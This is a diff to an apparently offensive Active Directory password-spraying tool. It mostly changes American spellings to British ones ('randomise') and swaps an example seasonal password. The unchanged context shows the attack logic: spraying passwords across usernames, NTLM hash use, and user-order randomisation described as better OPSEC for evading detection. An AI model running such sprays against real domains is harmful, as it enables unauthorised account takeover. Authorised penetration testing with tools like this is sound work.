@@ -564,7 +564,7 @@ class ADSpray:
     def spray(self, usernames: List[str], passwords: List[str],
               delay_between_users: bool = True, auth_user: Optional[str] = None,
               auth_pass: Optional[str] = None, is_hash: bool = False,
-              stop_on_success: bool = False, randomize: bool = False,
+              stop_on_success: bool = False, randomise: bool = False,
               shuffle_passwords: bool = False, exclude_patterns: Optional[List[str]] = None,
               save_state_file: Optional[str] = None, start_password_idx: int = 0) -> List[SprayResult]:
         """Execute password spray attack"""
@@ -588,8 +588,8 @@ class ADSpray:
         if stop_on_success:
             self.log("Stop-on-success mode enabled", "INFO")
 
-        if randomize:
-            self.log("User randomization enabled (better OPSEC)", "INFO")
+        if randomise:
+            self.log("User randomisation enabled (better OPSEC)", "INFO")
 
         if shuffle_passwords:
             self.log("Password shuffling enabled", "INFO")
@@ -621,9 +621,9 @@ class ADSpray:
             self.log(f"Password {pwd_idx}/{len(passwords)}: {password[:2]}{'*' * (len(password)-2)}")
             self.log(f"{'='*60}")
 
-            # Randomize user order for this password if enabled
+            # Randomise user order for this password if enabled
             current_users = usernames.copy()
-            if randomize:
+            if randomise:
                 random.shuffle(current_users)
 
             for user_idx, username in enumerate(current_users, 1):
@@ -734,7 +734,7 @@ Examples:
     --method kerberos --delay 60 --jitter 10
 
   # Single password spray with output
-  python adspray.py -d contoso.com -dc 192.168.1.10 -u users.txt -P "Summer2024!" \\
+  python adspray.py -d contoso.com -dc 192.168.1.10 -u users.txt -P "Winter2025!" \\
     -o results.json --format json
         """
     )
@@ -791,8 +791,8 @@ Examples:
                        help="Stop spray after first valid credential")
 
     # OPSEC and filtering options
-    parser.add_argument("--randomize", action="store_true",
-                       help="Randomize user order for each password (better OPSEC)")
+    parser.add_argument("--randomise", action="store_true",
+                       help="Randomise user order for each password (better OPSEC)")
     parser.add_argument("--shuffle-passwords", action="store_true",
                        help="Shuffle password order before spraying")
     parser.add_argument("--exclude", help="File containing usernames to exclude (one per line)")
@@ -1031,7 +1031,7 @@ Examples:
             results = sprayer.spray(users, passwords, auth_user=args.auth_user,
                                    auth_pass=args.auth_pass, is_hash=args.ntlm,
                                    stop_on_success=args.stop_on_success,
-                                   randomize=args.randomize,
+                                   randomise=args.randomise,
                                    shuffle_passwords=args.shuffle_passwords,
                                    exclude_patterns=exclude_patterns if exclude_patterns else None,
                                    save_state_file=args.save_state,
